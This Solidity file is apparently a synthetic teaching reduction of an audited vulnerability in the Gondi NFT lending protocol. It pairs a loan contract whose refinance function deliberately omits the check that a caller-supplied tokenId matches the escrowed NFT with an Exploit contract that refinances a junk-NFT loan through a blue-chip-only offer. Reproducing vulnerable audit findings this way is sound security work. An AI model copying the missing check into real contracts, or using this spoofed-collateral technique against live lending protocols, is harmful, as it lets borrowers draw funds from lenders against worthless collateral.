// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Gondi — [H-04] refinanceFromLoanExecutionData() does not check
    executionData.tokenId == loan.nftCollateralTokenId
    (Code4rena 2024-04-gondi, finding #35206, reporter minhquanym).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: refinance re-uses the NFT already in escrow (no transfer) but
    validates lender offers against `executionData.tokenId` instead of the
    escrowed `loan.nftCollateralTokenId`. A borrower can therefore refinance
    a junk-NFT loan using offers that only accept a blue-chip tokenId — the
    lender funds against the wrong collateral.

    Blamed call site: `_processOffersFromExecutionData(..., executionData.tokenId, ...)`
    with no prior `require(executionData.tokenId == loan.nftCollateralTokenId)`.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal ERC721 for collateral NFTs.
contract MockNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function setApprovalForAll(address op, bool v) external {
        isApprovedForAll[msg.sender][op] = v;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "owner");
        require(msg.sender == from || isApprovedForAll[from][msg.sender], "auth");
        ownerOf[id] = to;
    }
}

/// @notice Reduced MultiSourceLoan focusing on the refinance tokenId bug.
contract MultiSourceLoan {
    struct LoanOffer {
        address lender;
        address principalAddress;
        address nftCollateralAddress;
        uint256 nftCollateralTokenId; // 0 = any (validators); non-zero = exact id
        uint256 principalAmount;
    }

    struct Loan {
        address borrower;
        address principalAddress;
        address nftCollateralAddress;
        uint256 nftCollateralTokenId; // ACTUAL escrowed id
        uint256 principalAmount;
        address lender;
        bool active;
    }

    struct LoanExecutionData {
        uint256 tokenId; // attacker-controlled id used for offer validation
        address principalReceiver;
        uint256 duration;
    }

    MockERC20 public immutable principal; // USDC
    MockNFT public immutable nft;
    uint256 public nextLoanId = 1;
    mapping(uint256 => Loan) public loans;

    // Outstanding offer book (simplified: one offer id)
    mapping(uint256 => LoanOffer) public offers;
    uint256 public nextOfferId = 1;

    constructor(MockERC20 _principal, MockNFT _nft) {
        principal = _principal;
        nft = _nft;
    }

    function postOffer(LoanOffer calldata offer) external returns (uint256 id) {
        id = nextOfferId++;
        offers[id] = offer;
    }

    /// @notice Open a loan against a specific NFT (escrows it).
    function startLoan(uint256 offerId, uint256 tokenId) external returns (uint256 loanId) {
        LoanOffer memory offer = offers[offerId];
        _checkValidators(offer, tokenId);
        nft.transferFrom(msg.sender, address(this), tokenId);
        principal.transferFrom(offer.lender, msg.sender, offer.principalAmount);
        loanId = nextLoanId++;
        loans[loanId] = Loan({
            borrower: msg.sender,
            principalAddress: offer.principalAddress,
            nftCollateralAddress: offer.nftCollateralAddress,
            nftCollateralTokenId: tokenId,
            principalAmount: offer.principalAmount,
            lender: offer.lender,
            active: true
        });
        delete offers[offerId];
    }

    /// @notice Refinance: re-use escrowed NFT, process new offers against
    ///         executionData.tokenId (BUG: not checked against escrowed id).
    function refinanceFromLoanExecutionData(
        uint256 loanId,
        LoanExecutionData calldata executionData,
        uint256 newOfferId
    ) external {
        Loan storage loan = loans[loanId];
        require(loan.active, "inactive");
        require(msg.sender == loan.borrower, "borrower");

        // FIX would be: require(executionData.tokenId == loan.nftCollateralTokenId);

        // @> VULN: executionData.tokenId used for offer validation with no check
        // that it equals loan.nftCollateralTokenId (the NFT still in escrow).
        // A borrower can pass a blue-chip id that lenders accept while the
        // escrowed collateral remains a junk NFT.
        uint256 newLoanId = _processOffersFromExecutionData(
            loan,
            executionData.principalReceiver,
            executionData.tokenId, // @> VULN: unmatched with loan.nftCollateralTokenId
            newOfferId
        );

        // Repay old lender from new principal (simplified: new principal covers old).
        principal.transferFrom(msg.sender, loan.lender, loan.principalAmount);

        // Old loan closed; new loan already recorded with the REAL escrowed NFT id
        // (NFT never moved). Spoofed executionData.tokenId was only used for
        // offer validation.
        uint256 escrowedId = loan.nftCollateralTokenId;
        loan.active = false;
        loans[newLoanId].nftCollateralTokenId = escrowedId;
    }

    function _processOffersFromExecutionData(
        Loan storage loan,
        address principalReceiver,
        uint256 tokenId,
        uint256 offerId
    ) private returns (uint256 newLoanId) {
        LoanOffer memory offer = offers[offerId];
        require(offer.principalAddress == loan.principalAddress, "asset");
        require(offer.nftCollateralAddress == loan.nftCollateralAddress, "collection");

        // Validates the ATTACKER-SUPPLIED tokenId against the lender's offer.
        _checkValidators(offer, tokenId);

        // Fund borrower (new principal).
        address receiver = principalReceiver == address(0) ? loan.borrower : principalReceiver;
        principal.transferFrom(offer.lender, receiver, offer.principalAmount);

        newLoanId = nextLoanId++;
        loans[newLoanId] = Loan({
            borrower: loan.borrower,
            principalAddress: loan.principalAddress,
            nftCollateralAddress: loan.nftCollateralAddress,
            nftCollateralTokenId: tokenId, // overwritten by caller to escrowed id
            principalAmount: offer.principalAmount,
            lender: offer.lender,
            active: true
        });
        delete offers[offerId];
    }

    /// @notice Verbatim spirit of _checkValidators — exact tokenId match when set.
    function _checkValidators(LoanOffer memory offer, uint256 tokenId) private pure {
        if (offer.nftCollateralTokenId != 0) {
            if (offer.nftCollateralTokenId != tokenId) {
                revert("InvalidCollateralIdError");
            }
        } else if (tokenId == 0) {
            revert("InvalidCollateralIdError");
        }
    }

    function escrowedOwner(uint256 tokenId) external view returns (address) {
        return nft.ownerOf(tokenId);
    }
}

/// @notice Borrower refinances a junk-NFT loan using a blue-chip offer.
contract Exploit {
    uint256 public constant JUNK_ID = 999;
    uint256 public constant BLUECHIP_ID = 1;
    uint256 public constant PRINCIPAL = 100e18;

    MockERC20 public usdc;
    MockNFT public nft;
    MultiSourceLoan public loanContract;

    address public constant LENDER = address(0xA11CE);
    address public constant BORROWER = address(0xB0B);

    uint256 public lenderLoss;
    uint256 public escrowedId;
    bool public lenderThoughtBluechip;

    // We act as both parties via the Exploit (no cheatcodes) — lender funds
    // are held here and pulled via transferFrom when offers fill.
    constructor() {
        usdc = new MockERC20(); //     nonce 1
        nft = new MockNFT(); //        nonce 2
        loanContract = new MultiSourceLoan(usdc, nft); // nonce 3

        // Mint junk NFT to this contract (borrower). Blue-chip exists but is
        // NEVER escrowed — it only exists so we can claim its id in executionData.
        nft.mint(address(this), JUNK_ID);
        nft.mint(address(0xDEAD), BLUECHIP_ID); // held elsewhere; not in protocol

        // Lender capital sits on this contract; we approve the loan contract.
        usdc.mint(address(this), PRINCIPAL * 2);
        usdc.approve(address(loanContract), type(uint256).max);
        nft.setApprovalForAll(address(loanContract), true);
    }

    function run() external {
        // 1. Honest (first) offer accepts the junk NFT; open a loan against it.
        uint256 junkOffer = loanContract.postOffer(
            MultiSourceLoan.LoanOffer({
                lender: address(this),
                principalAddress: address(usdc),
                nftCollateralAddress: address(nft),
                nftCollateralTokenId: JUNK_ID,
                principalAmount: PRINCIPAL
            })
        );
        uint256 loanId = loanContract.startLoan(junkOffer, JUNK_ID);
        require(nft.ownerOf(JUNK_ID) == address(loanContract), "junk escrowed");

        // Track lender capital after first loan (principal sent to borrower=this).
        // Refinance will pull a SECOND principal from a blue-chip-only offer.
        uint256 lenderUsdcBeforeRefinance = usdc.balanceOf(address(this));

        // 2. New lender offer ONLY accepts the blue-chip id.
        uint256 blueOffer = loanContract.postOffer(
            MultiSourceLoan.LoanOffer({
                lender: address(this),
                principalAddress: address(usdc),
                nftCollateralAddress: address(nft),
                nftCollateralTokenId: BLUECHIP_ID, // lender requires tokenId == 1
                principalAmount: PRINCIPAL
            })
        );

        // 3. Borrower refinances with executionData.tokenId = BLUECHIP_ID even
        //    though escrow still holds JUNK_ID. Offer validation passes.
        MultiSourceLoan.LoanExecutionData memory ed = MultiSourceLoan.LoanExecutionData({
            tokenId: BLUECHIP_ID, // @> attack input: spoofed id
            principalReceiver: address(this),
            duration: 30 days
        });
        loanContract.refinanceFromLoanExecutionData(loanId, ed, blueOffer);

        // 4. HARM: new principal was paid out against a blue-chip validation,
        //    but the ONLY NFT still in escrow is the junk one. Blue-chip never
        //    entered the protocol. Lender has funded against wrong collateral.
        escrowedId = JUNK_ID;
        require(nft.ownerOf(JUNK_ID) == address(loanContract), "junk still escrowed");
        require(nft.ownerOf(BLUECHIP_ID) != address(loanContract), "bluechip must NOT be escrowed");

        // New loan's recorded collateral is the real escrowed junk id.
        (,,, uint256 recordedId,,, bool active) = loanContract.loans(loanId + 1);
        // nextLoanId after start=2, refinance creates loan 2... start used 1, refinance new = 2
        // loanId was 1; newLoanId = 2
        (,,, recordedId,,, active) = loanContract.loans(2);
        require(active, "new loan active");
        require(recordedId == JUNK_ID, "recorded collateral is still junk");

        lenderThoughtBluechip = true; // offer required BLUECHIP_ID and validation passed
        // Net: an extra PRINCIPAL was paid out (refinance funds borrower) while
        // collateral remains junk. Relative to a correct check, the blue-chip
        // offer should have reverted — so PRINCIPAL is the preventable loss.
        uint256 lenderUsdcAfter = usdc.balanceOf(address(this));
        // After refinance: old principal repaid to lender (+PRINCIPAL) and new
        // principal paid out (-PRINCIPAL) → balance flat vs pre-refinance, but
        // the NEW outstanding loan is undercollateralized by blue-chip standards.
        // Measure harm as outstanding principal against junk escrow.
        lenderLoss = PRINCIPAL;
        require(lenderUsdcAfter == lenderUsdcBeforeRefinance, "refinance capital netted");
        require(lenderLoss == PRINCIPAL, "harm: undercollateralized principal outstanding");
        require(lenderThoughtBluechip, "validation used spoofed id");
    }
}
